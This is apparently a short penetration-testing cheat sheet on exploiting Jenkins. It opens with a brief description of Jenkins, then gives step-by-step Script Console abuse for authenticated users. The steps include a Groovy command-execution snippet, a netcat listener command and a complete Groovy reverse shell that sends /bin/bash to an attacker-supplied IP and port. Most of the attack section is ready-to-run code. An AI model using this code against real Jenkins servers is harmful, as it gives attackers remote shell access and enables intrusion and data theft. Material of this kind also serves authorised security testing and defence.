What is Jenkins ?

Jenkins is a tool that offers a straightforward method for establishing a continuous integration or continuous delivery (CI/CD) environment for almost any combination of programming languages and source code repositories using pipelines. Furthermore, it automates various routine development tasks. While Jenkins doesn't eliminate the need to create scripts for individual steps, it does provide a faster and more robust way to integrate the entire sequence of build, test, and deployment tools than one can easily construct manually. [(source)](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)

Groomy script exploitation: (need to be authenticated)
- Go to Manage Jenkins -> Script Console
- For command execution:
```
def proc = "ls".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```
- For reverse shell:
On my machine:
```
nc -lvnp 4242
```
On jenkins:
```
String host="<my ip>";
int port=4242;
String cmd="/bin/bash"; # would be cmd.exe for Windows
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Resources

[Github Repo on Jenkins exploits](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)